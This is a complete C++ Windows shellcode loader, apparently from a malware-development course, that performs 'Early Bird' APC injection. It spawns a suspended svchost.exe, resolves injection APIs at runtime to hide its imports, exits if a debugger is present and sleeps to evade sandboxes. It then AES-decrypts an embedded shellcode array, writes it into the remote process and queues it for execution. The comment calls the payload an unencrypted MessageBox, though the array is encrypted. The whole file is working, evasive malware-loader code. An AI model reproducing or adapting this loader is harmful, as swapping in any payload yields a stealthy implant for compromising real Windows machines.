#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <string>

typedef BOOL (WINAPI* pfnWriteProcessMemory)(
    IN  HANDLE  hProcess,
    IN  LPVOID  lpBaseAddress,
    IN  LPCVOID lpBuffer,
    IN  SIZE_T  nSize,
    OUT SIZE_T* lpNumberOfBytesWritten
);

typedef LPVOID (WINAPI* pfnVirtualAllocEx)(
    IN           HANDLE hProcess,
    IN OPTIONAL  LPVOID lpAddress,
    IN           SIZE_T dwSize,
    IN           DWORD  flAllocationType,
    IN           DWORD  flProtect
);

typedef DWORD (WINAPI* pfnQueueUserAPC)(
    IN PAPCFUNC  pfnAPC,
    IN HANDLE    hThread,
    IN ULONG_PTR dwData
);

typedef BOOL (WINAPI* pfnCreateProcessW)(
    IN OPTIONAL       LPCWSTR               lpApplicationName,
    IN OUT OPTIONAL   LPWSTR                lpCommandLine,
    IN OPTIONAL       LPSECURITY_ATTRIBUTES lpProcessAttributes,
    IN OPTIONAL       LPSECURITY_ATTRIBUTES lpThreadAttributes,
    IN                BOOL                  bInheritHandles,
    IN                DWORD                 dwCreationFlags,
    IN OPTIONAL       LPVOID                lpEnvironment,
    IN OPTIONAL       LPCWSTR               lpCurrentDirectory,
    IN                LPSTARTUPINFOW        lpStartupInfo,
    OUT               LPPROCESS_INFORMATION lpProcessInformation
);

typedef DWORD (WINAPI* pfnResumeThread)(
    IN HANDLE hThread
);

// MessageBox shellcode - 64-bit (exitfunc = thread)
//         - >> Hello World ! <<
//              UNENCRYPTED
unsigned char key[] = { 0x49, 0xe6, 0x28, 0xd7, 0x42, 0xe, 0xc6, 0xcd, 0x5f, 0x44, 0xea, 0x89, 0xe0, 0x72, 0x91, 0x90 };
unsigned char shellcode[] = { 0xd3, 0xa4, 0x32, 0xa3, 0x85, 0x87, 0xc9, 0x24, 0xf7, 0x20, 0x52, 0xa9, 0xa2, 0xac, 0xf3, 0x7a, 0xcc, 0x3c, 0x4f, 0xa0, 0x67, 0x52, 0x38, 0x36, 0xc2, 0xf, 0x1e, 0x14, 0x84, 0x8c, 0x2b, 0x6a, 0x3c, 0x4, 0xba, 0x57, 0x9c, 0x83, 0x68, 0x36, 0xe4, 0xb7, 0x1a, 0x2f, 0x86, 0x83, 0xfa, 0xae, 0x6f, 0x2a, 0xb9, 0x1f, 0x47, 0xa8, 0xa, 0x95, 0xc4, 0x90, 0xc2, 0x3d, 0xef, 0xdf, 0xae, 0x51, 0x6f, 0x3e, 0xec, 0x29, 0xe8, 0x2b, 0x5f, 0x54, 0xec, 0x9a, 0x99, 0x89, 0x2b, 0xa3, 0xe4, 0xf7, 0x2e, 0x56, 0x30, 0x27, 0xdc, 0x23, 0x36, 0x7c, 0x29, 0xfe, 0x5b, 0xb0, 0x4b, 0xe2, 0x0, 0x98, 0xfb, 0xa1, 0xa7, 0xec, 0x4e, 0x51, 0x76, 0x94, 0x1b, 0x24, 0xc4, 0xaf, 0xa1, 0xd7, 0xa5, 0xc5, 0x49, 0xfa, 0x10, 0x55, 0xba, 0xe9, 0x6a, 0xee, 0x84, 0x3c, 0x89, 0x16, 0x4f, 0xef, 0xfc, 0xc8, 0x51, 0xbd, 0x7b, 0x9f, 0x32, 0x23, 0x1, 0x9f, 0x90, 0xbf, 0x70, 0x79, 0x5, 0x39, 0x66, 0xc1, 0xdf, 0x97, 0xd6, 0x18, 0xfe, 0xa4, 0xa2, 0xe0, 0xc5, 0xc7, 0x4b, 0x8e, 0x5d, 0x1d, 0xdb, 0xaa, 0x84, 0x3a, 0xd0, 0x5f, 0x62, 0xcc, 0x70, 0x3b, 0x17, 0x2c, 0x35, 0xe8, 0x39, 0x12, 0xbb, 0x94, 0x7, 0x69, 0x73, 0x33, 0xee, 0x61, 0x9, 0xef, 0x46, 0xe8, 0xfa, 0x8e, 0xf, 0x4f, 0x9, 0x83, 0xcc, 0x84, 0x49, 0x9e, 0x50, 0x27, 0x6b, 0x23, 0xcf, 0x9d, 0xec, 0x43, 0x2b, 0x23, 0xd7, 0x7e, 0x9f, 0x71, 0xf1, 0xae, 0xd3, 0x4c, 0xa5, 0xa4, 0x88, 0x41, 0xbe, 0x1a, 0x96, 0xc9, 0xe4, 0xc2, 0xed, 0xf7, 0x98, 0x44, 0xda, 0xdd, 0xc1, 0xe6, 0x72, 0x30, 0x24, 0xa1, 0xd2, 0x3d, 0x75, 0x7d, 0xe0, 0xf7, 0x88, 0xb0, 0x4f, 0x1d, 0xdc, 0xdd, 0xea, 0xc9, 0xec, 0xe2, 0x4, 0x70, 0x2c, 0x48, 0x13, 0x3b, 0x43, 0x12, 0x64, 0x2b, 0x59, 0xd0, 0x51, 0xb7, 0x1d, 0xaf, 0x57, 0xb0, 0x65, 0x75, 0x7c, 0xcd, 0xac, 0xf9, 0x39, 0xe0, 0xf8, 0x5c, 0xa2, 0x46, 0x9c, 0xc2, 0xa8, 0x73, 0xf4, 0x1b, 0x94, 0x1c, 0x9f, 0xf5, 0x15, 0x33, 0x52, 0x63, 0x87, 0x6c, 0xd5, 0x1b, 0x44, 0xb1, 0x27, 0xf, 0x6d, 0xf3, 0x1c, 0xb8, 0x51, 0x1c, 0x31, 0x5, 0x21, 0x85, 0x52, 0x80, 0x70, 0x51, 0xa2, 0x9e, 0x64, 0xa2, 0xdb, 0xc, 0x59, 0x3a, 0xe6, 0x33, 0x70, 0x5f, 0x6f, 0x8e, 0xc0, 0x1c, 0xd5, 0x65, 0x92, 0xea, 0x1c, 0xc0, 0x9a, 0xc5, 0xec, 0x60, 0x23, 0x80, 0x8d, 0x3d, 0x48, 0x4, 0xb5, 0xd, 0xb5, 0xdc, 0x99, 0x19, 0x63, 0xd5, 0xf7, 0x7, 0x73, 0xac, 0xe8, 0x5a, 0xa5, 0xc, 0xee, 0x3b, 0xbb, 0xc2, 0x44, 0x29, 0x4f, 0x1d, 0xb9, 0xfa, 0x22, 0x9d, 0x7b, 0x86, 0x9c, 0xc6, 0xfa, 0xfc, 0x66, 0x31, 0x7e, 0x5c, 0x60, 0xf4, 0x71, 0x70, 0x77, 0x54, 0xee, 0x82, 0x1e, 0xd7, 0x15, 0xf7, 0xc8, 0xc6, 0x28, 0x20, 0x42, 0x9d, 0xa8, 0x5e, 0x81, 0x8b, 0x5c, 0xf6, 0x41, 0x44, 0x53, 0x7b, 0xe9, 0x19, 0x6, 0xdd, 0x7e, 0xef, 0xe1, 0xf9, 0x80, 0xd6, 0x74, 0xac, 0xff, 0xcd, 0x51, 0xc8, 0x1, 0x6f, 0x10, 0x4e, 0xee, 0x82, 0x68, 0x2a, 0xc1, 0xad, 0xef, 0x4, 0xf9, 0xd4, 0xc0, 0x96 };

SIZE_T scSize = sizeof(shellcode);

// RTO Mal Dev course
int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    BOOL CryptAcquire = CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (CryptAcquire == false) {
        //printf("CryptAcquireContextW Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptCreate = CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    if (CryptCreate == false) {
        //printf("CryptCreateHash Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptHash = CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
    if (CryptHash == false) {
        //printf("CryptHashData Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL CryptDerive = CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    if (CryptDerive == false) {
        //printf("CryptDeriveKey Failed: %d\n", GetLastError());
        return -1;
    }

    BOOL Crypt_Decrypt = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len);
    if (Crypt_Decrypt == false) {
        //printf("CryptDecrypt Failed: %d\n", GetLastError());
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

int EarlyBird(HANDLE pHandle, HANDLE hThread, unsigned char* shellcode, SIZE_T scSize, DWORD Pid) {

    // Define NT imports
    // ------------------------------------------------------------------------------------------------------------
    pfnVirtualAllocEx pVirtualAllocEx = (pfnVirtualAllocEx)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "VirtualAllocEx");
    if (pVirtualAllocEx == NULL) {
        printf("[-] VirtualAllocEx [KERNL32] Failed     ->      [ %p ] [ %d ]\n", pVirtualAllocEx, GetLastError());
        return -2;
    }
    printf("[*] VirtualAllocEx [KERNEL32] Address       ->      [ %p ]\n", pVirtualAllocEx);
    
    pfnWriteProcessMemory pWriteProcessMemory = (pfnWriteProcessMemory)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "WriteProcessMemory");
    if (pWriteProcessMemory == NULL) {
        printf("[-] WriteProcessMemory [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pWriteProcessMemory, GetLastError());
        return -2;
    }
    printf("[*] WriteProcessMemory [KERNEL32] Address     ->      [ %p ]\n", pWriteProcessMemory);

    pfnQueueUserAPC pQueueUserAPC = (pfnQueueUserAPC)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "QueueUserAPC");
    if (pQueueUserAPC == NULL) {
        printf("[-] QueueUserAPC [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pQueueUserAPC, GetLastError());
        return -2;
    }
    printf("[*] QueueUserAPC [KERNEL32] Address       ->      [ %p ]\n", pQueueUserAPC);

    pfnResumeThread pResumeThread = (pfnResumeThread)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "ResumeThread");
    if (pResumeThread == NULL) {
        printf("[-] ResumeThread [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pResumeThread, GetLastError());
        return -2;
    }
    printf("[*] ResumeThread [KERNEL32] Address       ->      [ %p ]\n", pResumeThread);

    // ------------------------------------------------------------------------------------------------------------

    char pcName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD pcNameLength = sizeof(pcName);
    DWORD timer = 2000; //milliseconds

    if (IsDebuggerPresent() == TRUE) {
        return -3;
    }
    else {
        if (!GetComputerNameA(pcName, &pcNameLength)) {
            return -3;
        }
        printf("[SUCCESS] Computer Name   ->   [ %s ]\n", pcName);
        printf("[INFO] Sleeping for %d\n", timer);
        SleepEx(timer, FALSE);
    }

    LPVOID memAlloc = pVirtualAllocEx(pHandle, 0, scSize, MEM_COMMIT, PAGE_EXECUTE_READ);
    if (!memAlloc) {
        printf("[ERR] Memory Allocation Failed  [ %d ] \n", GetLastError());
        return -2;
    } printf("[INFO] Memory allocation pointer: %p\n", (LPVOID)memAlloc);

    AESDecrypt(shellcode, scSize, (char*)key, (size_t)sizeof(key));

    SIZE_T bytesWritten = 0;
    DWORD wMem = pWriteProcessMemory(pHandle, (LPVOID)memAlloc, shellcode, scSize, &bytesWritten);
    if (!wMem) {
        printf("[ERR] Write Memory Failed  [ %d ] \n", GetLastError());
        return -2;
    }

    if (pQueueUserAPC((PAPCFUNC)memAlloc, hThread, NULL)) {
        pResumeThread(hThread);
    }
    return 0;
}



int main() {

    pfnCreateProcessW pCreateProcessW = (pfnCreateProcessW)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateProcessW");
    if (pCreateProcessW == NULL) {
        printf("[-] CreateProcessW [KERNEL32] Failed     ->      [ %p ] [ %d ]\n", pCreateProcessW, GetLastError());
        return -2;
    }
    printf("[*] CreateProcessW [KERNEL32] Address       ->      [ %p ]\n", pCreateProcessW);

    // ------------------------------------------------------------------------------------------------------------

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    // Clear out startup and process info structures
    RtlSecureZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    RtlSecureZeroMemory(&pi, sizeof(pi));

    std::wstring pName = L"C:\\Windows\\System32\\svchost.exe";

    HANDLE pHandle = NULL;
    HANDLE hThread = NULL;
    DWORD Pid = 0;

    BOOL cProcess = pCreateProcessW(NULL, &pName[0], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (cProcess == FALSE) {
        printf("[ERR] Process not created\n");
        return 0;
    }
    //printf("[SUCCESS] Process created \n");

    pHandle = pi.hProcess;
    hThread = pi.hThread;

    Pid = pi.dwProcessId;

    EarlyBird(pHandle, hThread, shellcode, scSize, Pid);
    CloseHandle(pHandle);

	return 0;
}
